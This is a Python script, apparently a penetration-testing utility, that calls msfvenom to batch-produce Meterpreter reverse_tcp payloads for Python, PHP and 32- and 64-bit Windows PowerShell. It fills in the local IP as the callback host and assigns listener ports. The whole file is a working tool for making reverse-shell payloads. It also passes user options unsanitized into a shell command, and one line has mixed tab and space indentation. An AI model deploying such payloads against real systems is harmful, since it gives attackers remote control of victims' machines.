import sys,string,subprocess,socket
from optparse import OptionParser


def genpayload(pip,pport,ppayld,pformat,pdir,pfile,pext):

    msvcmd = "msfvenom -p " + ppayld + " LHOST=" + pip + " LPORT=" + str(pport) + " -f " + str(pformat) + " > " + str(pdir) + str(pfile) + "_" + str(pport) + "." + str(pext)
    #print("Cmd Would Be: " + msvcmd)

    #subprocess.call(["msfvenom","-p",ppayld,"LHOST="+str(pip),"LPORT="+str(pport),"-f",str(pformat)],stdout=str(pdir) + str(pfile)+"_"+str(pport)+"."+str(pext))
	subprocess.call(msvcmd,shell=True)
	



def main():
    
    usage = "usage: %prog [options]"
    parser = OptionParser(usage)
    parser.add_option('-p','--startport', action="store", dest="startport", type="int",
            help="Starting Port for generating listeners", metavar="PORT", default=4444)
    parser.add_option('-d','--diffports', action="store_true", dest="diffports",
            help="Use Different ports for each payload", default=False)
    parser.add_option('-i','--increment', action="store", dest="increment", type="int",
            help="Port Increment Value for Payloads (Default:1)", metavar="INC", default=1)
    parser.add_option('-s','--dir', action="store", dest="directory", type="string",
            help="Directory to store payloads - MUST EXIST (Default: ./)",default="./")

    (options, args) = parser.parse_args()

    myip = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
    print("[*] Your IP is: " + myip + "\n")
    if (options.diffports == True):
        print("[*] You are incrementing ports by " + str(options.increment) + "")
        inc = options.increment
    else:
        print("[*] You are NOT incrementing ports")
        inc = 0
    print("[*] Base port is " + str(options.startport) + "")
    port = options.startport
    if (options.directory[len(options.directory)-1] != '/'):
        opdir = options.directory + '/'
    else:
        opdir = options.directory
    print("[*] Storing Payloads in :" + str(opdir))

    print("\n[*] Generating the following payloads:")

    paylist = []
    paylist.append({'payload':'payload/python/meterpreter/reverse_tcp','format':'raw','file':'mtrprtr_python','ext':'py'})
    paylist.append({'payload':'payload/php/meterpreter/reverse_tcp','format':'raw','file':'mtrprtr_php','ext':'php'})
    paylist.append({'payload':'payload/windows/x64/meterpreter/reverse_tcp','format':'psh-cmd','file':'mtrprtr_64psh-cmd','ext':'cmd'})
    paylist.append({'payload':'payload/windows/meterpreter/reverse_tcp','format':'psh-cmd','file':'mtrprtr_psh-cmd','ext':'cmd'})

    for pkg in paylist:
        payload = pkg['payload']
        opformat = pkg['format']
        payfile = pkg['file']
        payext = pkg['ext']
        print("  [**] " + str(payload))
        genpayload(myip,port,payload,opformat,opdir,payfile,payext)
        port = port + inc

    print("\n[*] Payload generation complete\n")

if __name__ == "__main__":
    main()


